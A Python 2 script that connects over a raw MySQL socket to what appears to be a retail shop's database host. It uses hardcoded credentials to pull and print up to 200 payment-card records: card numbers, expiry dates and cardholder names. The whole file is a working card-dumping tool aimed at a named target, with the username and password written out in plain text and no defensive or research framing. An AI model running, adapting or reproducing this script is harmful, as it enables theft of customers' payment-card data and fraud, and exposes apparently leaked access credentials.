#!/usr/bin/env python2
# MySQL raw socket - dump encrypted cards from tienda.datostarjeta
import socket, struct, hashlib, sys

HOST = 'appdb.claroshop-services.net'
PORT = 3306
USER = 'adaxxidb'
PASS = 'JTQ6PrkecY3y1kVN'
DB = 'tienda'
QUERY = "SELECT id, numero, mes, ao, nombre FROM datostarjeta WHERE LENGTH(numero) > 10 ORDER BY id DESC LIMIT 200"

def read_packet(s):
    hdr = b''
    while len(hdr) < 4:
        hdr += s.recv(4 - len(hdr))
    length = struct.unpack('<I', hdr[:3] + b'\x00')[0]
    seq = struct.unpack('B', hdr[3:4])[0]
    data = b''
    while len(data) < length:
        data += s.recv(length - len(data))
    return seq, data

def make_auth(user, password, salt, db, seq):
    cap = 0x0003f7cf
    scramble = scramble_native(password, salt)
    payload = struct.pack('<IIB', cap, 16777216, 33)
    payload += b'\x00' * 23
    payload += user.encode() + b'\x00'
    payload += struct.pack('B', len(scramble)) + scramble
    payload += db.encode() + b'\x00'
    payload += b'mysql_native_password\x00'
    pkt = struct.pack('<I', len(payload))[:3] + struct.pack('B', seq) + payload
    return pkt

def scramble_native(password, salt):
    h1 = hashlib.sha1(password.encode()).digest()
    h2 = hashlib.sha1(h1).digest()
    h3 = hashlib.sha1(salt + h2).digest()
    return bytes(bytearray(a ^ b for a, b in zip(bytearray(h3), bytearray(h1))))

def read_lenenc_int(data, pos):
    b = struct.unpack('B', data[pos:pos+1])[0]
    if b < 251:
        return b, pos + 1
    elif b == 252:
        return struct.unpack('<H', data[pos+1:pos+3])[0], pos + 3
    elif b == 253:
        return struct.unpack('<I', data[pos+1:pos+4] + b'\x00')[0], pos + 4
    else:
        return struct.unpack('<Q', data[pos+1:pos+9])[0], pos + 9

def read_lenenc_str(data, pos):
    if struct.unpack('B', data[pos:pos+1])[0] == 0xfb:
        return None, pos + 1
    length, pos = read_lenenc_int(data, pos)
    return data[pos:pos+length], pos + length

def send_query(s, query, seq):
    payload = b'\x03' + query.encode()
    pkt = struct.pack('<I', len(payload))[:3] + struct.pack('B', seq) + payload
    s.sendall(pkt)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(15)
    s.connect((HOST, PORT))

    seq, greeting = read_packet(s)
    salt = greeting[4:4+8]
    rest_pos = greeting.find(b'\x00', 4) + 1
    rest_pos += 18
    salt2_end = greeting.find(b'\x00', rest_pos)
    salt += greeting[rest_pos:salt2_end]

    auth_pkt = make_auth(USER, PASS, salt, DB, seq + 1)
    s.sendall(auth_pkt)

    seq, resp = read_packet(s)
    if struct.unpack('B', resp[0:1])[0] == 0xff:
        print("AUTH_FAILED: " + resp[9:].decode('latin1'))
        sys.exit(1)
    if struct.unpack('B', resp[0:1])[0] == 0xfe:
        print("AUTH_SWITCH_REQUIRED")
        sys.exit(1)

    send_query(s, QUERY, 0)

    seq, data = read_packet(s)
    num_cols, _ = read_lenenc_int(data, 0)

    for _ in range(num_cols):
        seq, _ = read_packet(s)

    seq, eof = read_packet(s)

    count = 0
    while True:
        seq, row_data = read_packet(s)
        if struct.unpack('B', row_data[0:1])[0] == 0xfe and len(row_data) < 9:
            break
        if struct.unpack('B', row_data[0:1])[0] == 0xff:
            print("QUERY_ERR: " + row_data[9:].decode('latin1'))
            break
        pos = 0
        cols = []
        for _ in range(num_cols):
            val, pos = read_lenenc_str(row_data, pos)
            cols.append(val.decode('latin1') if val else '')
        print('|'.join(cols))
        count += 1

    print("TOTAL=" + str(count))
    s.close()
except Exception as e:
    print("ERROR: " + str(e))
